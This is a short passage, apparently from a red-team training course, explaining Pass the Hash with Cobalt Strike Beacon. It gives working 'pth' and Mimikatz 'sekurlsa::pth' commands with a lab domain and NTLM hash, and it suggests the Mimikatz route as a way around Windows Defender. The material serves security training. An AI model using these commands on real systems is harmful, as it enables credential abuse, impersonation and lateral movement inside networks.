_Pass the Hash_ (often shortened to _pth_) is a technique [T1550.002] that allows an adversary to leverage an NTLM hash for user impersonation.

Beacon has a built-in `pth` command - the syntax is simply `pth [DOMAIN\user] [hash]`.  This is a wrapper around `sekurlsa::pth`.  It will echo some random data into a named pipe, which Beacon will then [impersonate](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient) to assume the identity of the passed credentials.

```
beacon> pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889
```

However, as we saw in the [Defence Evasion](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=6996f680b85b43e4db02b8e0) chapter, this built-in technique will be prevented by Windows Defender.  An alternate approach is to have Mimikatz run a different process and steal its token manually.
```
beacon> mimikatz sekurlsa::pth /user:rsteel /domain:CONTOSO /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:%COMSPEC%
```